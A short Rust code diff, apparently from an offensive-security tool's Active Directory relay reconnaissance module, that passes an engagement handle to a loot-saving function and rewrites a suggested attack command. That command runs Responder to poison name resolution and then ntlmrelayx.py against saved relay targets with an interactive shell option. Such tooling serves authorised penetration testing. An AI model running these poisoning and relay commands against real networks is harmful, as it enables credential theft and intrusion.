@@ -28,7 +28,7 @@ impl AdRelayRecon {
             return Ok(json!({ "relay_targets": [] }).to_string());
         }
 
-        let loot = save_loot("relay", "targets.txt", targets.join("\n").as_bytes())
+        let loot = save_loot(&eng, "relay", "targets.txt", targets.join("\n").as_bytes())
             .await
             .unwrap_or_default();
 
@@ -45,7 +45,7 @@ impl AdRelayRecon {
             targets.len()
         );
         f.suggested_command = Some(format!(
-            "sudo responder -I <iface>   # poison, then in another shell:\nntlmrelayx.py -tf {} -smb2support -i",
+            "sudo responder -I <iface>   # poison, then in another shell:\nntlmrelayx.py -tf <(decebalus-backend loot decrypt {}) -smb2support -i",
             loot
         ));
         f.status = "suggested".into();
